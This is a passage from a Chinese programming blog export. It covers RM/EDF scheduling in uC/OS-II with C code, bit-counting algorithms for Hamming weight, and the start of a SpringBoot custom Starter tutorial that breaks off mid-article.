			&amp;TaskStk[i+5][0], 
			TASK_STK_SIZE,
			(void *)&amp;task_info_array[i],
			OS_TASK_OPT_NONE  // opt
		);
	}

	// 模拟时钟中断
	timeSetEvent(1000/OS_TICKS_PER_SEC, 0, OSTickISRuser, 0, TIME_PERIODIC);

	OSStart();	       
	return(0);
}
</code></pre>
<p>使用 <code>OSTaskCreateExt</code> 创建任务，传入扩展信息块的指针。</p>
<p><code>FirstTask</code> 中为死循环，什么也不用做。</p>
<pre><code class="language-c">int FirstTask(void *pParam)
{
	for(;;)
	{
	}
	return(0); 
}
</code></pre>
<h2>时钟中断</h2>
<p>每次时钟嘀嗒到来时，完成以下操作：</p>
<ul>
<li>将当前运行任务的计算时间减 1
<ul>
<li>如果任务计算完毕则挂起</li>
</ul>
</li>
<li>遍历 TCB 链表，将剩余周期减 1</li>
<li>遍历 TCB 链表，将剩余截止时间减 1（EDF 算法）</li>
<li>遍历 TCB 链表，检查是否有任务需要恢复。如果需要恢复则重置一下参数。</li>
</ul>
<pre><code class="language-c">void  OSTimeTick (void)
{
    OS_TCB    *ptcb;
    /*********** 此位置源码省略 ***************/
	if (OSRunning == OS_TRUE) {
	
	/*********** 此位置源码省略 ***************/

		ptcb = OSTCBList;  /* Point at first TCB in TCB list               */

		// lab2 c--;
		if(OSTCBCur-&gt;OSTCBPrio != OS_TASK_IDLE_PRIO){
			if(((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;rest_c &gt; 0){
				// 剩余有计算时间则减减
				((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;rest_c--;

				printf(&quot;%-10d 任务%d compute... 执行计算工作\n&quot;,OSTimeGet(),((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;task_id);
				if(((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;rest_c == 0){
					// 任务的计算时间归零，设置任务为挂起状态
					((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;is_pend = 1;
					printf(&quot;%-10d 任务%d complete! 挂起 \n&quot;,OSTimeGet(),((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;task_id);
					OSTaskSuspend(OSTCBCur-&gt;OSTCBPrio);
				}
			}
		}
        
        while (ptcb-&gt;OSTCBPrio != OS_TASK_IDLE_PRIO) {     /* Go through all TCBs in TCB list              */
            OS_ENTER_CRITICAL();

			// Lab2 所有的任务的剩余周期和剩余截止时间都减1（除了空闲任务后的两个任务）
			if(ptcb-&gt;OSTCBPrio&lt;OS_TASK_IDLE_PRIO-2 ){ 
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;rest_t--;
#ifdef LAB2_EDF
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;rest_d--;
#endif
			}
			// 恢复任务（除了空闲任务后的两个任务）
			if( ptcb-&gt;OSTCBPrio&lt;OS_TASK_IDLE_PRIO-2 &amp;&amp; OSTimeGet() % ((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;t == 0){
				// 当前时间为任务周期整数倍时恢复任务
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;rest_c=((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;c;
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;rest_t=((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;t;
#ifdef LAB2_EDF
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;rest_d=((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;d;
#endif
				// 设置任务为未挂起状态
				((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;is_pend = 0;

				OSTaskResume(ptcb-&gt;OSTCBPrio);
			}

			/*********** 此位置源码省略 ***************/
        }
    }
}
</code></pre>
<blockquote>
<p>遍历的时候不要处理一些无关的任务，比如空闲任务，甚至统计任务等莫名奇妙的任务。所以有类似 <code>ptcb-&gt;OSTCBPrio&lt;OS_TASK_IDLE_PRIO-2</code> 这种判定条件。</p>
</blockquote>
<h2>任务抢占输出</h2>
<p>任务抢占将调用 <code>OSIntExit()</code>，如果最高优先级不是当前任务的优先级时判定为任务抢占。</p>
<pre><code class="language-c">void  OSIntExit (void)
{
#if OS_CRITICAL_METHOD == 3u                               /* Allocate storage for CPU status register */
    OS_CPU_SR  cpu_sr = 0u;
#endif

    if (OSRunning == OS_TRUE) {
        OS_ENTER_CRITICAL();
        if (OSIntNesting &gt; 0u) {                           /* Prevent OSIntNesting from wrapping       */
            OSIntNesting--;
        }
        if (OSIntNesting == 0u) {                          /* Reschedule only if all ISRs complete ... */
            if (OSLockNesting == 0u) {                     /* ... and not locked.                      */
                OS_SchedNew();
                OSTCBHighRdy = OSTCBPrioTbl[OSPrioHighRdy];
                if (OSPrioHighRdy != OSPrioCur) {          /* No Ctx Sw if current task is highest rdy */
					printf(&quot;%-10d Preempt 即将发生任务抢断\n&quot;,OSTimeGet());
#if OS_TASK_PROFILE_EN &gt; 0u
                    OSTCBHighRdy-&gt;OSTCBCtxSwCtr++;         /* Inc. # of context switches to this task  */
#endif
                    OSCtxSwCtr++;                          /* Keep track of the number of ctx switches */
                    OSIntCtxSw();                          /* Perform interrupt level ctx switch       */
                }
            }
        }
        OS_EXIT_CRITICAL();
    }
}
</code></pre>
<h1>调度算法实现</h1>
<h2>替换调度策略</h2>
<p><code>OSStart</code> 中通过 <code>OS_SchedNew</code> 获取当前最高优先级的任务。通过修改 <code>OS_SchedNew</code> 实现函数可进行调度算法的替换。</p>
<pre><code class="language-c">void  OSStart (void)
{
    if (OSRunning == OS_FALSE) {
        OS_SchedNew();  /* Find highest priority's task priority number   */
        OSPrioCur     = OSPrioHighRdy;
        OSTCBHighRdy  = OSTCBPrioTbl[OSPrioHighRdy]; /* Point to highest priority task ready to run    */
        OSTCBCur      = OSTCBHighRdy;
        OSStartHighRdy();   /* Execute target specific code to start task     */
    }
}

static  void  OS_SchedNew (void)
{
	Sched_Algorithm();
	// 把OS_SchedNew的内容注释掉
}
</code></pre>
<h2>RM 算法与 EDF 算法</h2>
<p>两种算法使用同一种扩展的数据结构 <code>tcb_ext_info</code> 好处在于代码改动非常小。与 RM 的区别在于找出的是距离截止时间最近的任务作为最高优先级任务。</p>
<p>算法基本流程：</p>
<pre><code class="language-plantuml">start
:获取TCB链表;
:初始化最小值min_prio;
while (优先级是否符合要求?)
	:进入临界区;
	if (该任务延迟时间为0?) then (yes)
		if (需要比较的优先级参数是否比当前存储的优先级min_prio小?) then (yes)
			:min_prio更新为最小值;
			:最高优先级任务更改为此任务;
		endif
	endif
	:退出临界区;
	:ptcb指向下一个TCB;
endwhile (no)
stop
</code></pre>
<p>以下代码通过宏 <code>LAB2_EDF</code> 切换使用不同的算法。</p>
<blockquote>
<p>[!hint] 本文源码中涉及宏 <code>LAB2_EDF</code> 的文件<br>
激活 EDF 算法记得在以下文件定义宏 <code>LAB2_EDF</code>：</p>
<ul>
<li><code>main.c</code></li>
<li><code>os_core.c</code></li>
</ul>
<p>问：为什么不单独引入一个独立的头文件方便激活或取消宏？<br>
答：因为我电脑里的古董 VC6 做不到，它会崩溃🤬</p>
</blockquote>
<pre><code class="language-c">void Sched_Algorithm(void){
	OS_TCB *ptcb;
	INT32U min_prio;
	tcb_ext_info* task_info;
	INT32U tmp;

	ptcb = OSTCBList;

	OS_ENTER_CRITICAL();
	min_prio = 2147483647; // INT32U MAX
	OSPrioHighRdy = OS_TASK_IDLE_PRIO;
	OS_EXIT_CRITICAL();


	while(ptcb-&gt;OSTCBPrio&lt;OS_TASK_IDLE_PRIO-2){ //  &amp;&amp; ptcb-&gt;OSTCBPrio != 1
		OS_ENTER_CRITICAL();
		if(ptcb-&gt;OSTCBDly==0 &amp;&amp; ((tcb_ext_info*)ptcb-&gt;OSTCBExtPtr)-&gt;is_pend == 0 ){
			task_info = (tcb_ext_info*)ptcb-&gt;OSTCBExtPtr;
#ifdef LAB2_EDF
			tmp = task_info-&gt;rest_d;
#else
			tmp = task_info-&gt;t;
#endif
			if(tmp&lt;min_prio){
				min_prio = tmp;
				OSPrioHighRdy = ptcb-&gt;OSTCBPrio;
			}

		}
		
		ptcb = ptcb-&gt;OSTCBNext;
		OS_EXIT_CRITICAL();
	}
}
</code></pre>
<blockquote>
<p>[!hint] 改进提示<br>
为了节省代码编写，RM 和 EDF 采用了同样的遍历链表的逻辑，但对于 RM 来说还可以进一步改进——不使用遍历的方式找到最高优先级，从而提高运行效率。</p>
</blockquote>
<h1>运行结果</h1>
<h2>RM 算法</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240622155303.webp" alt="image.png"></p>
<p>案例 1 示例输出：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240622155420.webp" alt="image.png"></p>
<h2>EDF 算法</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240622155325.webp" alt="image.png|500"></p>
<p>案例 1 的示例输出：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240622155536.webp" alt="image.png"></p>
<h1>后记</h1>
<p>本实验的重要 <a href="https://www.cnblogs.com/iterationjia/p/13986006.html">参考文章</a> 中的思路是：每次 <code>OSTimeTick</code> 计算该时刻任务剩余的周期数 <code>rest_t</code>，然后让任务自己延迟（<code>OSTimeDly</code>）自己，在下一个任务周期就绪。比如它的任务函数是：</p>
<pre><code class="language-c">// 任务函数
int FirstTask(void *pParam)
{
	// 此处位置代码省略
	for(;;)
	{
        while(((tcb_ext_info*)OSTCBCur-&gt;OSTCBExtPtr)-&gt;rest_c &gt; 0){}
		OS_ENTER_CRITICAL();		
		// 此处位置代码省略
		OS_EXIT_CRITICAL();
		OSTimeDly(task_info-&gt;rest_t);
		
	}
	return(0); 
}
</code></pre>
<blockquote>
<p>🐢⭐：这种实现会有点怪。</p>
</blockquote>
<p>这样虽然会实现目的，但是我感觉这是任务自己参与去做调度这件事情。而且 <code>OSTimeDly</code> 还不准，一开始输出很正确，运行一会就陷入死循环或程序卡死了，甚至每次编译运行的结果都不一样🤬。</p>
<p>本篇文章通过 <code>OSTimeTick</code> 统一决定任务的挂起与恢复就绪，让任务函数本身更纯粹一些。当然，拓展的数据结构 <code>tcb_ext_info</code> 中可能会遗留一些没有用到的变量，读者可视情况删除。</p>
<h1>实验源码</h1>
<p>GitHub：<a href="https://github.com/uuanqin/ucosii-rm-edf-experiment">uuanqin/ucosii-rm-edf-experiment: ucosii中实现RM和EDF任务调度算法实验源码。 (github.com)</a></p>
<p><a href="https://github.com/uuanqin/ucosii-rm-edf-experiment"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=ucosii-rm-edf-experiment" alt="Readme Card"></a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.cnblogs.com/iterationjia/p/13986006.html">基于μcOS-II实时操作系统源码实现RMS和EDF调度（共享资源） - iterationjia - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/oNew_Lifeo/article/details/115189603">在github上上传本地项目步骤（两种方式）_github怎么往项目本体传-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2009578670" class="record">
            <header>
                <h1 class="record-title">计算汉明重量的两个技巧性算法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>数学与算法</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('汉明重量');">汉明重量</button>
                    
                    <button class="btn" onclick="activeTag('汉明距离');">汉明距离</button>
                    
                    <button class="btn" onclick="activeTag('位运算');">位运算</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/6/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240706190421.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>计算二进制串中 1 的个数骚操作</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>77c7bcae</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>计算二进制串的汉明重量</h1>
<p><a href="https://baike.baidu.com/item/%E6%B1%89%E6%98%8E%E9%87%8D%E9%87%8F">汉明重量</a> 是一串符号中非零符号的个数。对于二进制串来说就是 <code>1</code> 的个数 [^kr]。</p>
<blockquote>
<p>[!example] 题目：<a href="https://leetcode.cn/problems/number-of-1-bits/description/">191. 位1的个数 - 力扣（LeetCode）</a><br>
编写一个函数，获取一个正整数的二进制形式并返回其二进制表达式中设置位的个数。</p>
</blockquote>
<p>[^kr]: 2023 USTC SSE 复试机试题</p>
<h2>常规算法</h2>
<p>常规方法：循环检查二进制位，判断每一位整数是否为 1。</p>
<ul>
<li>时间复杂度：$O(k)$，k 是二进制整数的位数</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h2>Brian Kernighan 算法</h2>
<blockquote>
<p>Brian Kernighan 算法发布在 1988 年出版的 The C Programming Language (Second Edition) （由 Brian W. Kernighan 和 Dennis M. Ritchie 编写）的练习中，但是 Donald Knuth 在 2006 年 4 月 19 日指出，该方法第一次是由 Peter Wegner 在 1960 年的 CACM3 上出版。读者可以在上述书籍中找到更多位操作的技巧。</p>
</blockquote>
<p>统计数 x 二进制表示中 1 的个数可以使用 Brian Kernighan 算法可以加速统计。</p>
<p>算法核心：记 $f(x)$ 表示 <code>x</code> 和 <code>x−1</code> 进行与运算所得的结果，即 $f(x)=$<code>x &amp; (x−1)</code>，那么 $f(x)$ 恰为 x 删去其二进制表示中最右侧的 1 的结果。</p>
<blockquote>
<p>[!example] 例子<br>
<code>x     = 0b10001000</code><br>
<code>x-1    = 0b10000111</code><br>
<code>x&amp;(x-1) = 0b10000000</code></p>
</blockquote>
<p>时间复杂度：$O(\log C)$。C 表示元素的数据范围，循环次数等于 x 的二进制位中 1 的个数。当 x 为 32 位整数时 ，最坏情况下 x 二进制位全部为 1，我们需要循环 $\log 2^{31}=31$ 次。</p>
<p>空间复杂度：$O(1)$，我们只需要常数的空间保存若干变量。</p>
<h2>MIT HAKM 算法</h2>
<blockquote>
<p>MIT Hackmem 169</p>
</blockquote>
<p>求 32 位无符号数的二进制形式中 1 的个数。</p>
<p>核心原理是分治法。</p>
<pre><code class="language-c">int bitcount(unsigned int n)
{
    unsigned int tmp;

    tmp = n - ((n &gt;&gt; 1) &amp; 033333333333)
            - ((n &gt;&gt; 2) &amp; 011111111111); // 注意这是8进制表示
    return ((tmp + (tmp &gt;&gt; 3)) &amp; 030707070707)%63;
}
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240706182641.webp" alt="image.png"></p>
<p>考虑 3 位 2 进制数 x：<code>abc</code></p>
<ul>
<li><code>x&gt;&gt;1 == 4a+2b+c&gt;&gt;1==2a+b</code></li>
<li><code>x&gt;&gt;2 == 4a+2b+c&gt;&gt;2==a</code></li>
<li><code>4a+2b+c-(2a+b)-a == a+b+c</code></li>
<li>因此 <code>x-x&gt;&gt;1-x&gt;&gt;2 == a+b+c</code> 即为 1 的个数</li>
</ul>
<p>把 32 位数按每 3 位划分，通过掩码，完成每 3 位的移位减操作，这样每 3 位中的值就是这 3 位中 1 的个数。</p>
<p>每相邻 3 位相加，mask 后，每 6 位中的值即为 6 位中 1 的个数</p>
<p><code>64^5*t6+64^4*t5+64^3*t4+64^2*t3+64*t2+t1 mod 63 = t6+t5+t4+t3+t2+t1</code> 即为 32 位中 1 的个数。取模 63 不出错的要点在于 x 是个 32 位的数，t6+t5+t4+t3+t2+t1 不会被模掉。</p>
<blockquote>
<p>注意是取模 63，而不是 64。</p>
</blockquote>
<h1>延伸应用：计算两个整数之间的汉明距离</h1>
<blockquote>
<p>[!example] 题目：<a href="https://leetcode.cn/problems/hamming-distance/description/">461. 汉明距离 - 力扣（LeetCode）</a><br>
给你两个整数 x 和 y，计算并返回它们之间的汉明距离。</p>
</blockquote>
<p>两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。<a href="https://baike.baidu.com/item/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB">汉明距离</a> 广泛应用于多个领域。在编码理论中用于错误检测，在信息论中量化字符串之间的差异。</p>
<p>方法：</p>
<ol>
<li>计算 x 和 y 之间的汉明距离，可以先计算 <code>x^y</code></li>
<li>然后统计结果中等于 1 的位数。可以使用 Brian Kernighan 算法。</li>
</ol>
<p>其他相关题目：</p>
<ul>
<li><a href="https://leetcode.cn/problems/convert-integer-lcci/description/">面试题 05.06. 整数转换 - 力扣（LeetCode）</a></li>
</ul>
<h1>本文参考</h1>
<ul>
<li>《深入理解计算机系统》第 3 版</li>
<li>研究生课程 CSAPP 课件</li>
<li>LeetCode 相关题目</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="565697069" class="record">
            <header>
                <h1 class="record-title">SpringBoot 的原理以及写一个自定义 Starter</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Java');">Java</button>
                    
                    <button class="btn" onclick="activeTag('SpringBoot');">SpringBoot</button>
                    
                    <button class="btn" onclick="activeTag('Spring');">Spring</button>
                    
                    <button class="btn" onclick="activeTag('starter');">starter</button>
                    
                    <button class="btn" onclick="activeTag('SDK');">SDK</button>
                    
                    <button class="btn" onclick="activeTag('maven');">maven</button>
                    
                    <button class="btn" onclick="activeTag('Hutool');">Hutool</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/16/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240717190725.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>记录开发简易 Starter 的基本步骤</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>21b7da2d</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>Spring 与 SpringBoot</h1>
<p>Spring 发展到今天已经形成了一种开发生态圈，Spring 提供了若干个子项目，每个项目用于完成特定的功能。</p>
<p>Spring 和 SpringBoot：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240503235738.webp" alt="image.png"></p>
<p>Spring Boot 可以帮助我们非常快速的构建应用程序、<strong>简化开发</strong>、提高效率。SpringBoot 简化配置，本质还是 Spring，<strong>SpringBoot 不能替代 Spring</strong>。官方推荐的学习路径可以从 SpringBoot 开始。</p>
<p>SpringBoot 使用简单快捷的原因是因为底层提供了：</p>
<ul>
<li>起步依赖：简化 <code>pom.xml</code> 的配置</li>
<li>自动配置：简化 bean 的声明以及配置</li>
</ul>
<blockquote>
<p>当我们提到 SpringBoot 的原理时，就指的是起步依赖和自动配置的原理。在面试中，如果问 SpringBoot 原理，就是在着重问你自动配置的原理（面试高频）。</p>
</blockquote>
<h1>SpringBoot 的原理</h1>
<h2>起步依赖（Starters）</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240716220724.webp" alt="image.png|450"></p>
<p>利用 <strong>Maven 的依赖传递</strong>，我们可以直接简单引用起步依赖即可自动引用常见依赖：</p>
<ul>
<li><code>spring-boot-starter-web</code>：包含了 web 应用开发所需要的常见依赖。内嵌有 Tomcat。</li>
<li><code>spring-boot-starter-test</code>：包含了单元测试所需要的常见依赖。</li>
<li><code>spring-boot-starter-aop</code>：AOP 起步依赖</li>
</ul>
<p>起步依赖的版本号都在父工程中指定（在 <code>pom.xml</code> 中被 <code>&lt;parent&gt;</code> 标签括住的内容）。</p>
<blockquote>
<p>Maven 的依赖传递示意：<img src="https://cdn.gallery.uuanqin.top/img/20240503232439.webp" alt="image.png|500"></p>
</blockquote>
<h2>自动配置</h2>
<p>SpringBoot 的自动配置就是当 spring 容器启动后，一些配置类、bean 对象就自动存入到了 IOC 容器中，不需要我们手动去声明，从而简化了开发，省去了繁琐的配置操作。</p>
<p>IDEA 中查看所有 Bean 对象示例：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240716221306.webp" alt="image.png"></p>
<h3>自动配置方式示例</h3>
<ol>
<li>在启动类前加上 <code>@ComponentScan</code> 指定扫描的范围</li>
</ol>
<pre><code class="language-java">// 方式一：在启动类前加上 @ComponentScan 指定扫描的范围
// 这样我们自己定义的 Bean 就能使用
// 缺点：按照这种方式的话，每使用一个第三方依赖，就要指定扫描的包。导致使用繁琐，大面积扫描导致性能低。
@ComponentScan({&quot;com.example&quot;,&quot;top.uuanqin&quot;})
@SpringBootApplication
public class SpringbootWebConfig2Application {}
</code></pre>
<ol start="2">
<li>启动类前加上 <code>@Import</code> 导入</li>
</ol>
<pre><code class="language-java">// 方式二：启动类前加上@Import导入。
// 使用 @Impor t导入的类会被 Spring 加载到IOC容器中。
// 导入形式可以是普通类、配置类、ImportSelector的接口实现类
@Import({TokenParser.class, HeaderConfig.class}) // 或者 @Import({MyImportSelector.class})
@SpringBootApplication
public class SpringbootWebConfig2Application {}

/**************** TokenParser.java *****************/
// 导入普通类：TokenParser.class，TokenParser定义时不需要加任何注解。
@Component // 此注解可有可无
public class TokenParser {
	public void parse(){
		System.out.println(&quot;TokenParser ... parse ...&quot;);
	}
}

/**************** HeaderConfig.java *****************/
// 导入配置类：HeaderConfig.class，相关注解：@Configuration @Bean
@Configuration
public class HeaderConfig{
	@Bean
	public HeaderParser headerParser(){
		return new HeaderParser();
	}
	
	@Bean
	public HeaderGenerator headerGenerator(){
		return new HeaderGenerator();
	}
}

/**************** MyImportSelector.java *****************/
// 导入ImportSelector的接口实现类：MyImportSelector.class，这个类 implements ImportSelector，并实现了其中的selectImports方法
public class MyImportSelector implements ImportSelector{
	public String[] selectImports(AnnotationMetadata importingClassMetadata){
	return new String[]{&quot;com.example.HeaderConfig&quot;};
}
</code></pre>
<ol start="3">
<li>启动类前使用 <code>@EnableXxxx</code> 注解，该注解封装了 <code>@Import</code>。这种方式更方便和优雅，是 SpringBoot 中所采用的方式。只有第三方依赖提供者最清楚应该导入什么类。</li>
</ol>
<pre><code class="language-java">// 启动类前使用 @EnableXxxx 注解
@EnableHeaderConfig // 我们只需要加上这个注解就行，就不用记指定的类了
@SpringBootApplication
public class SpringbootWebConfig2Application {}

/**************** EnableHeaderConfig.java *****************/
@Retention(RetentionPolicy.RUNTIME) // 元注解
@Target (ElementType.TYPE)      // 元注解
@Import(MyImportSelector.class) // 指定导入的配置类
public @interface EnableHeaderConfig {}


/**************** MyImportSelector.java *****************/
public class MyImportSelector implements ImportSelector{
	public String[] selectImports(AnnotationMetadata importingClassMetadata){
	return new String[]{&quot;com.example.HeaderConfig&quot;}; // 第三方依赖开发者自己写的
}
</code></pre>
<h3>源码浅析自动装配原理</h3>
<p>启动类/引导类注解 <code>@SpringBootApplication</code> 是 SpringBoot 项目的基石。它封装了以下注解：</p>
<ul>
<li><code>@SpringBootConfiguration</code>：
<ul>
<li>封装了 <code>@Configuration</code>，用于表明该类是配置类，允许在 Spring 上下文中注册额外的 bean 或导入其他配置类。</li>
</ul>
</li>
<li><code>@ComponentScan</code>：组件扫描注解，默认扫描当前包及其子包</li>
<li><code>@EnableAutoConfiguration</code>：SpringBoot 实现<strong>自动配置的核心</strong>。封装了：
<ul>
<li><code>@AutoConfigurationPackage</code>。以前我们直接使用 Spring 的时候，需要在 xml 中的 <code>context:component-scan</code> 中定义好 base-package，那么 Spring 在启动的时候，就会扫描该包下及其子包下被 <code>@Controller</code>、<code>@Service</code> 与 <code>@Component</code> 标注的类，并将这些类注入到容器中。<code>@AutoConfigurationPackage</code> 则会将被注解标注的类，即主配置类，将主配置类所在的包当作 base-package，而不用我们自己去手动配置了。这也就是为什么我们需要将主配置类放在项目的最外层目录中的原因。</li>
<li><code>@Import(AutoConfigurationImportSelector.class)</code>。<code>AutoConfigurationImportSelector</code> 类中读取以下文本文件。但是文本文件标识的类只会根据需要（条件装配 <code>@Conditional</code>）进行加载。
<ul>
<li><code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code>（2.7.0 之后的版本）</li>
<li><code>META-INF/spring.factories</code>（老版本，目前的存在只为兼容）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>我们发现，文本文件 <code>META-INF/spring/xxx.imports</code> 中定义了许多许多的 Bean，但并不是所有的 Bean 都会注册到 IOC 容器。声明 <code>@Bean</code> 对象前，可以添加注解 <code>@Conditional</code>。<code>@Conditional</code> 按照一定的条件进行判断，在满足给定条件后才会注册对应的 bean 对象到 Spring IOC 容器中。作用在方法或类中。</p>
<p><code>@Conditional</code> 本身是一个父注解，派生出大量的子注解。常用的有：</p>
<ul>
<li><code>@ConditionalOnClass</code>：判断环境中是否有对应字节码文件，才注册 bean 到 IOC 容器</li>
<li><code>@ConditionalOnMissingBean</code>：判断环境中如果<strong>没有</strong>对应的 bean（类型 或 名称），才注册 bean 到 IOC 容器。主要用于声明默认 Bean 对象。指定类型（value 属性）或名称（name 属性）。</li>
<li><code>@ConditionalOnProperty</code>：判断配置文件中有对应属性和值，才注册 bean 到 IOC 容器。</li>
</ul>
<pre><code class="language-java">@Bean
@ConditionalOnClass(name =&quot;io.jsonwebtoken.Jwts&quot;)//当前环境存在指定的这个类时，才声明该bean
public HeaderParser headerParser(){...}

@Bean
@ConditionalOnMissingBean //当不存在当前类型的bean时，才声明该bean
public HeaderParser headerParser(){...}

@Bean
@ConditionalOnProperty(name =&quot;name&quot;,havingValue =&quot;itheima&quot;)//配置文件中存在对应的属性和值，才注册bean到IOC容器
public HeaderParser headerParser(){...}
</code></pre>
<h1>自定义 Starter 示例</h1>
<h2>Starter</h2>
<p>起步依赖 Starter 的应用场景：</p>
<ul>
<li>在实际开发中，经常会定义一些公共组件，提供给各个项目团队使用。而在 SpringBoot 的项目中，一般会将这些公共组件封装为 SpringBoot 的 starter。</li>
<li>开发 SDK，方便他人调用功能。使用 SDK 的开发人员只需要关心调用接口的方式和传递的参数。可以在 application.yml 中进行配置。</li>
</ul>
<p>命名规范：</p>
<ol>
<li>SpringBoot 官方提供的起步依赖，它的命名基本上就是 <code>spring-boot-...</code>
<ul>
<li>自动配置功能：<code>spring-boot-autoconfigure</code></li>
<li>依赖管理功能：<code>spring-boot-starter-xxx</code></li>
</ul>
</li>
<li>第三方提供的起步依赖命名规范：<code>功能-spring-boot-...</code>
<ul>
<li>自动配置功能：<code>xxx-spring-boot-autoconfigure</code></li>
<li>依赖管理功能：<code>xxx-spring-boot-starter</code></li>
</ul>
</li>
</ol>
<p>上面两个关键的模块：<code>starter</code> 和 <code>autoconfigure</code></p>
<ul>
<li><code>starter</code> 模块进行依赖管理功能，里面没有任何 Java 代码，它的作用在于配置好 <code>pom.xml</code>。会将 <code>autoconfigure</code> 自动配置模块引入进来。</li>
</ul>
<h2>案例介绍</h2>
<p>本文演示的案例：</p>
<ul>
<li>需求：自定义 myrandom-spring-boot-starter，完成返回随机数工具类 <code>MyRamdomUtils</code> 的自动配置。我们通过编写配置文件指定随机数字符串的长度。</li>
<li>目标：引入起步依赖之后，要想使用自己的工具类时，直接注入 <code>MyRamdomUtils</code> 使用即可</li>
</ul>
<p>在使用自定义 Starter 之前，我们使用自己的工具类是需要完成以下工作：</p>
<pre><code class="language-xml">&lt;!-- pom.xml --&gt;
&lt;!-- 需要引入大量的依赖 --&gt;
&lt;dependency&gt;
	&lt;groupId&gt;com.example&lt;/groupId&gt;
	&lt;artifactId&gt;ramdom&lt;/artifactId&gt;
	&lt;version&gt;1.0.0&lt;/version&gt;
&lt;/dependency&gt;
...
&lt;dependency&gt;
	...
&lt;/dependency&gt;
</code></pre>
<pre><code class="language-java">/************************* 定义参数配置类 *************************/
@Data
@Component
@ConfigurationProperties(prefix = 'myrandom')
public class MyRamdomProperties{
	...
}

/************************* 自己写一个工具类 *************************/
@Component
public class MyRamdomUtils{
	@Autowired
	private MyRamdomProperties myRamdomProperties;
	...
}
</code></pre>
<pre><code class="language-yaml"># application.yml
# 配置随机数工具类
myrandom:
	length: 5
		...
</code></pre>
<p>我们需要自己引入大量的依赖，还要定义参数配置类，并实现工具类。创建完自定义 Starter 后，我们只需注入 Bean 并配置即可。</p>
<p>自定义 Starter 基本步骤：</p>
<ul>
<li>创建 <code>myrandom-spring-boot-starter</code> 模块，进行依赖管理功能。</li>
<li>创建 <code>myrandom-spring-boot-autoconfigure</code> 模块，在 starter 中引入该模块，进行自动配置。</li>
<li>在 <code>myrandom-spring-boot-autoconfigure</code> 模块中的定义自动配置功能，并定义自动配置文件 <code>META-INF/spring/xxx.imports</code>（新版本 SpringBoot）</li>
</ul>
<h2>创建 starter 模块</h2>
<p>在 IDEA 中创建新项目 demo-starter 空的工程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240717152923.webp" alt="image.png|500"></p>
<p>项目里面创建 starter 模块：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240717153350.webp" alt="image.png|500"></p>
<blockquote>
<p>如果 IDEA 没有识别为 Spring 项目，可以右键 <code>pom.xml</code> 选择 Add as Maven Project 选项即可。</p>
</blockquote>
<p>后续我们可以在 <code>pom.xml</code> 根据需要改低一下 springboot 的版本。</p>
<p><code>pom.xml</code> 删除以下多于的信息，比如：</p>
<ul>
<li>指定正确的 SpringBoot 版本</li>
<li>删去描述性的内容标签，比如 <code>&lt;name&gt;</code> <code>&lt;description&gt;</code></li>
